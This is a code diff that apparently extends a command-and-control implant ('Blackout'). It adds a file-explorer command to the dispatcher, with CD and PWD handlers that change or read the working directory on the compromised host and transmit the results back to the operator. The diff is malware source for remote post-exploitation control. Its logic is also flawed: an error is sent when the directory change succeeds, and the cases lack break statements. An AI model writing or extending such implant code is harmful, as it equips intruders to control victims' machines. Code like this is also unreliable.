@@ -7,6 +7,7 @@ FUNC VOID CommandDispatcher(
 
     Instance()->Commands[ 0 ] = { .ID = BLACKOUT_CHECKIN, .Function = CommandCheckin };
     Instance()->Commands[ 1 ] = { .ID = COMMAND_RUN,      .Function = CommandRun };
+    Instance()->Commands[ 2 ] = { .ID = COMMAND_EXPLORER, .Function = CommandExplorer };
 
     PPACKAGE Package     = NULL;
     PARSER   Parser      = { 0 };
@@ -100,14 +101,34 @@ FUNC VOID CommandRun(
 FUNC VOID CommandExplorer(
     _In_ PPARSER Parser
 ) {
-    EXPLR Explorer;
+    BLACKOUT_INSTANCE
 
+    EXPLR Explorer = ParserGetInt32( Parser );
+    BOOL  bCheck   = FALSE;
+
+    BK_PACKAGE = PackageCreate( COMMAND_EXPLORER );
+    
     switch ( Explorer )
     {
     case CD: {
+        PSTR DestDir = ParserGetString( Parser, NULL ); 
+        bCheck = Instance()->Win32.SetCurrentDirectoryA( DestDir );
+        if ( bCheck )
+            PackageTransmitError( NtLastError() );
 
+        PackageAddInt32( BK_PACKAGE, CD );
+        PackageTransmit( BK_PACKAGE, NULL, NULL );
     }
-        break;
+    case PWD: {
+        CHAR CurDir[MAX_PATH];
+        bCheck = Instance()->Win32.GetCurrentDirectoryA( MAX_PATH, CurDir );
+        if ( !bCheck )
+            PackageTransmitError( NtLastError() );
+        
+        PackageAddInt32( BK_PACKAGE, PWD );
+        PackageAddString( BK_PACKAGE, CurDir );
+        PackageTransmit( BK_PACKAGE, NULL, NULL );
+    }
     
     default:
         break;
